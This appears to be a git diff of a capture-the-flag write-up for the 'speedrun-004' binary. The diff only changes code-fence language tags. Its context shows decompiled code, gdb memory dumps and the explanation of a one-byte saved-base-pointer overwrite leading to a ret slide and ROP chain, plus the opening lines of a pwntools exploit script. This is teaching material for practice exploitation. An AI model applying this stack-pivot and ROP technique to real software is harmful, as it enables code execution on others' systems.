@@ -2,7 +2,7 @@
 
 Let's take a look at the binary:
 
-```
+```console
 $    file speedrun-004
 speedrun-004: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=3633fdca0065d9365b3f0c0237c7785c2c7ead8f, stripped
 $    pwn checksec speedrun-004
@@ -26,7 +26,7 @@ So it is a `64` bit statically linked binary with `NX`. When we run it, it just 
 
 Reversing out the binary with Ghidra, we find this function:
 
-```
+```c
 undefined8
 FUN_00400c46(undefined8 uParm1,undefined8 uParm2,undefined8 uParm3,undefined8 uParm4,
             undefined8 uParm5,undefined8 uParm6)
@@ -48,7 +48,7 @@ FUN_00400c46(undefined8 uParm1,undefined8 uParm2,undefined8 uParm3,undefined8 uP
 
 Realistically the part we care about here, is that the `funStuff` function is called. The `betterCoding` and `slowpoke` functions essentially just print text. Looking at the `funStuff` function, we see this:
 
-```
+```c
 
 void funStuff(void)
 
@@ -77,7 +77,7 @@ void funStuff(void)
 ```
 In this function it prompts us for an integer, and if it is between 1-257, it will run the `scanInput` function with the integer we gave it as input. Also the `fgets`, `atoi`, and `print` functions I reversed them by just seeing their arguments and what they did (and named them accordingly), I didn't actually confirm that they were the actual functions correspond to. Looking at `scanInput`, we can see a bug.
 
-```
+```c
 void scanInput(int iParm1)
 
 {
@@ -97,7 +97,7 @@ Here we can see that it is calling `fgets` on the char array `input` which allow
 
 Before we talk about this, let's talk about stack frames:
 
-```
+```text
 +------------+
 | stack data |
 |      v1    |
@@ -113,7 +113,7 @@ The `stack data` represents the various variables that are kept on the stack (fo
 
 The thing is, the saved instruction pointer is stored on top of the saved stack. We can see that here in gdb:
 
-```
+```gdb
 gef➤  info frame
 Stack level 0, frame at 0x7ffe9fd84120:
  rip = 0x400baf; saved rip = 0x400c44
@@ -131,7 +131,7 @@ gef➤  x/2i 0x400c44
 
 We can see that the saved base pointer is `0x7ffe9fd84110`, which immediately following that is `0x400c44` which is the return instruction. This will be executed as soon as the function returns. However we can see that what it does is runs the `leave` and `ret` instructions. When the second `ret` instruction is executed, it will execute the second qword value on the stack (since there have been no variables allocated on the stack, the first qword is the saved base pointer, and the second is the saved instruction pointer). Thus since we get to overwrite the least significant byte of the saved base pointer, we can decide what pointer gets executed with the second return. We can see that the second return happens right after `scanInput` gets called:
 
-```
+```nasm
         00400c3f e8 2f ff        CALL       scanInput                                        undefined scanInput()
                  ff ff
                              LAB_00400c44                                    XREF[2]:     00400c21(j), 00400c38(j)  
@@ -143,7 +143,7 @@ Now our input is directly above the base and instruction pointer. Depending on t
 
 Here is a quick look at how the memory gets corrupted:
 
-```
+```gdb
 ────────────────────────────────────────────────────────────────────────────────────────── stack ────
 0x00007fff383d4ba0│+0x0000: 0x0000000000000000   ← $rsp
 0x00007fff383d4ba8│+0x0008: 0x0000010100000000
@@ -195,7 +195,7 @@ gef➤  x/g 0x7fff383d4cb0
 
 We can see here before the `fgets` call that is made that the saved base pointer is `0x7fff383d4cd0`. After the `fgets` call, we can see that the saved base pointer is overwritten to `0x7fff383d4c000`:
 
-```
+```gdb
 ──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
      0x400ba7                  mov    rsi, rax
      0x400baa                  mov    edi, 0x0
@@ -243,7 +243,7 @@ gef➤  x/22g 0x7fff383d4c00
 
 So we can see that the saved base pointer has been overwritten to `0x7fff383d4c00` which will cause the instruction address at `0x7fff383d4c08` to be executed with the second `ret`, which will be one of the gadgets for the ret slide. When it returns, we can see it starts off with the `leave/ret` instructions at `0x400c44`:
 
-```
+```nasm
 ──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
      0x400bca                  call   0x40ffb0
      0x400bcf                  nop    
@@ -260,7 +260,7 @@ So we can see that the saved base pointer has been overwritten to `0x7fff383d4c0
 
 Proceeding that we can see that the ret instructions that are part of our retslide that are executed:
 
-```
+```nasm
 ──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
      0x400c39                  or     cl, BYTE PTR [rbx-0x387603bb]
      0x400c3f                  call   0x400b73
@@ -278,7 +278,7 @@ Proceeding that we can see that the ret instructions that are part of our retsli
 After that we can see the beginning of our ROP chain is executed, which gives us code execution:
 
 
-```
+```nasm
 ──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
  →   0x415f04                  pop    rax
      0x415f05                  ret    
@@ -292,7 +292,7 @@ After that we can see the beginning of our ROP chain is executed, which gives us
 ## Exploit
 
 Putting it all together, we get the following exploit:
-```
+```python
 from pwn import *
 
 target = process('./speedrun-004')
@@ -357,7 +357,7 @@ target.interactive()
 ```
 
 After we run it a few times:
-```
+```console
 $ python exploit.py
 [+] Starting local process './speedrun-004': pid 10089
 w
